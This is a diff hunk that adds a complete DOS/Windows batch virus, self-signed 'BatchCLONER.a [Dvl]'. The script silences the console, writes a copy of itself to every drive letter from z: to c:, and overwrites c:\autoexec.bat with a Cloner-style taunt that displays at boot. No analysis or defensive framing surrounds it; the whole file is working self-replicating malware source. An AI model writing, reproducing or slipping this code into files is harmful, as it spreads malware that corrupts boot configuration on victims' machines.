@@ -1,0 +1,25 @@
+%random%
+@echo off
+cls
+@ver|find "XP"|if errorlevel 1 ctty nul|if not errorlevel 1 exit
+cls
+@type %0>sex.bat
+@echo.>>sex.bat
+@echo.>>sex.bat
+@dir>>sex.bat
+@echo.>>sex.bat
+@echo.>>sex.bat
+@ver|time>>sex.bat
+@echo.>>sex.bat
+@echo.>>sex.bat
+@ver|date>>sex.bat
+@echo.>>sex.bat
+@echo.>>sex.bat
+@echo.cls>>sex.bat
+@echo y|for %%d in (z:\,y:\,x:\,w:\,v:\,u:\,t:\,s:\,r:\,q:\,p:\,o:\,n:\,m:\,l:\,k:\,j:\,i:\,h:\,g:\,f:\,e:\,d:\,c:\) do copy sex.bat %%d >nul
+@echo.@echo                It will get on all your disks>c:\autoexec.bat
+@echo.@echo                It will infiltrate your chips>>c:\autoexec.bat
+@echo.@echo                It will stick to you like glue>>c:\autoexec.bat
+@echo.@echo                It will modify ram too>>c:\autoexec.bat
+@echo.@echo                Yes, ... it`z BatchCLONER.a [Dvl]>>c:\autoexec.bat
+cls
